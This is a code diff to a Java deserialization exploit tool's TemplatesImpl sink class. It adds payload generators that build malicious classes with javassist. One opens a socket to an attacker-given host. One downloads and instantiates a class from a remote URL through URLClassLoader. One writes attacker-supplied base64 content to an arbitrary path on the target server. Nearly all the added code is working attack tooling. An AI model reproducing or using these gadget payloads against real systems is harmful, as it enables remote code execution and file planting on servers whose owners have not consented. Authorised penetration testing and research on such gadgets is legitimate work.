@@ -2,16 +2,20 @@ package com.ppp.sinks;
 
 import com.ppp.JavaClassHelper;
 import com.ppp.JavaClassScheduler;
-import com.ppp.scheduler.MemShellScheduler;
+import com.ppp.Printer;
 import com.ppp.sinks.annotation.EnchantType;
 import com.ppp.sinks.annotation.Sink;
 import com.ppp.utils.ClassFiles;
 import com.ppp.utils.Gadgets;
 import com.ppp.utils.Reflections;
+import com.ppp.utils.RemoteLoadD;
+import com.ppp.utils.maker.Encoder;
 import com.ppp.utils.maker.JavaClassUtils;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import javassist.*;
+
+import java.io.FileInputStream;
 
 /**
  * @author Whoopsunix
@@ -47,8 +51,7 @@ public class TemplatesImpl {
         extendsAbstractTranslet(ctClass, sinksHelper);
 
 
-        Object templatesImpl = createTemplatesImpl(ctClass.toBytecode());
-        return templatesImpl;
+        return createTemplatesImpl(ctClass.toBytecode());
     }
 
 
@@ -84,8 +87,143 @@ public class TemplatesImpl {
         extendsAbstractTranslet(ctClass, sinksHelper);
 
 //        new BASE64Encoder().encode(ctClass.toBytecode());
-        Object templatesImpl = createTemplatesImpl(ctClass.toBytecode());
-        return templatesImpl;
+        return createTemplatesImpl(ctClass.toBytecode());
+    }
+
+    /**
+     * Socket 探测
+     *
+     * @param sinksHelper
+     * @return
+     * @throws Exception
+     */
+    @EnchantType({EnchantType.Socket})
+    public Object socket(SinksHelper sinksHelper) throws Exception {
+        String className = "SocketD";
+
+        String thost = sinksHelper.getHost();
+
+        String[] hostSplit = thost.split("[:]");
+        String host = hostSplit[0];
+        int port = 80;
+        if (hostSplit.length == 2)
+            port = Integer.parseInt(hostSplit[1]);
+
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass = pool.makeClass(className);
+        CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
+        ctConstructor.setBody(String.format("new java.net.Socket(\"%s\", %d);", host, port));
+        ctClass.addConstructor(ctConstructor);
+
+        // 是否继承 AbstractTranslet
+        extendsAbstractTranslet(ctClass, sinksHelper);
+
+//        new BASE64Encoder().encode(ctClass.toBytecode());
+        return createTemplatesImpl(ctClass.toBytecode());
+    }
+
+    /**
+     * 远程类加载
+     *
+     * @param sinksHelper
+     * @return
+     * @throws Exception
+     */
+    @EnchantType({EnchantType.RemoteLoad})
+    public Object remoteLoad(SinksHelper sinksHelper) throws Exception {
+        String className = "RemoteLoadD";
+
+        String url = sinksHelper.getUrl();
+        String remoteClassName = sinksHelper.getRemoteClassName();
+        Object constructor = sinksHelper.getConstructor();
+
+
+        ClassPool pool = ClassPool.getDefault();
+        CtClass ctClass = null;
+
+        if (constructor != null) {
+            // 转为 Integer
+            try {
+                constructor = Integer.parseInt(constructor.toString());
+            } catch (Exception e) {
+            }
+            Class constructorType = constructor.getClass();
+
+            ctClass = pool.get(RemoteLoadD.class.getName());
+            JavaClassUtils.fieldChangeIfExist(ctClass, "url", String.format("private static String url = \"%s\";", url));
+            JavaClassUtils.fieldChangeIfExist(ctClass, "className", String.format("private static String className = \"%s\";", remoteClassName));
+
+            if (constructorType.equals(Integer.class)) {
+                JavaClassUtils.fieldChangeIfExist(ctClass, "param", "private static Object param = new Integer(123);");
+            } else if (constructorType.equals(String.class)) {
+                JavaClassUtils.fieldChangeIfExist(ctClass, "param", String.format("private static Object param = \"%s\";", constructor));
+            }
+
+        } else {
+            ctClass = pool.makeClass(className);
+            CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
+            String code = String.format("{java.net.URL url = new java.net.URL(\"%s\");\n" +
+                    "        java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});\n" +
+                    "        Class loadedClass = classLoader.loadClass(\"%s\");\n" +
+                    "        Object object = loadedClass.getConstructor(null).newInstance(null);}", url, remoteClassName);
+            ctConstructor.setBody(code);
+            ctClass.addConstructor(ctConstructor);
+        }
+
+
+        // 是否继承 AbstractTranslet
+        extendsAbstractTranslet(ctClass, sinksHelper);
+
+//        new BASE64Encoder().encode(ctClass.toBytecode());
+        return createTemplatesImpl(ctClass.toBytecode());
+    }
+
+    /**
+     * 文件写入
+     *
+     * @param sinksHelper
+     * @return
+     * @throws Exception
+     */
+    @EnchantType({EnchantType.FileWrite})
+    public Object fileWrite(SinksHelper sinksHelper) throws Exception {
+        String className = "FileWriteD";
+
+        String serverFilePath = sinksHelper.getServerFilePath();
+        String localFilePath = sinksHelper.getLocalFilePath();
+        String fileContent = sinksHelper.getFileContent();
+
+        byte[] contentBytes = new byte[]{};
+
+        if (localFilePath != null) {
+            try {
+                FileInputStream fileInputStream = new FileInputStream(localFilePath);
+                contentBytes = new byte[fileInputStream.available()];
+                fileInputStream.read(contentBytes);
+                fileInputStream.close();
+            } catch (Exception e) {
+                Printer.error("File read error");
+            }
+        } else if (fileContent != null) {
+            contentBytes = fileContent.getBytes();
+        }
+
+        String b64 = Encoder.base64encoder(contentBytes);
+
+
+        ClassPool pool = ClassPool.getDefault();
+
+        CtClass ctClass = pool.makeClass(className);
+        CtConstructor ctConstructor = new CtConstructor(new CtClass[]{}, ctClass);
+        ctConstructor.setBody(String.format("{        java.lang.String b = \"%s\";\n" +
+                "        final byte[] bytes = new sun.misc.BASE64Decoder().decodeBuffer(b);\n" +
+                "        java.io.FileOutputStream fileOutputStream = new java.io.FileOutputStream(\"%s\");\n" +
+                "        fileOutputStream.write(bytes);\n" +
+                "        fileOutputStream.close();}",b64, serverFilePath));
+        ctClass.addConstructor(ctConstructor);
+
+
+        return createTemplatesImpl(ctClass.toBytecode());
     }
 
 
@@ -102,8 +240,7 @@ public class TemplatesImpl {
 
         byte[] classBytes = JavaClassScheduler.build(javaClassHelper);
 
-        Object templatesImpl = createTemplatesImpl(classBytes);
-        return templatesImpl;
+        return createTemplatesImpl(classBytes);
     }
 
 
